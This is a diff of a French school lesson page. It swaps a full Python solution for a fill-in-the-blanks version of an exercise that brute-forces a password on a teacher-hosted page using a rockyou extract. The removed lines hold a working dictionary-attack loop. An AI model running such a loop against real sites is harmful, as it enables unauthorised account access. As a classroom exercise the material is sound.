@@ -245,23 +245,32 @@ L'un de ces mots de passe est le mot de passe demandé à la page  [http://glass
 
 Lequel ?
 
-??? note "Correction"
+??? note "Aide"
     ```python linenums='1'
     import requests
-
+    
+    # récupération de la réponse à la requête en cas d'erreur de mot de pass 
     page_error = requests.get("http://glassus1.free.fr/repBF.php?pass=")
-
+    
+    # création d'un liste contenant les mdp du fichier "extraitrockyou.txt"
     liste_mdp = open("extraitrockyou.txt").read().splitlines()
-
+    
     url = "http://glassus1.free.fr/repBF.php?pass="
 
-    for mdp in liste_mdp:
-        new_url = url + mdp
+    # boucle pour tester les mdp de liste_mdp
+    ... :
+        new_url = ...  # création de l'url 
         print(new_url)
-        page_tentative = requests.get(new_url)
-        if page_tentative.text != page_error.text:
-            print("Le mot de passe est le suivant :", mdp)
-            break
+	
+	# récupération de la réponse à la requête avec new_url 
+        page_tentative = ...
+	
+	# comparaison du contenu de la réponse avec celui de page_error
+        ... :
+	    # on affiche le mdp trouvé
+            ...
+	    # on stoppe la boucle
+            ...
     ```
 
 
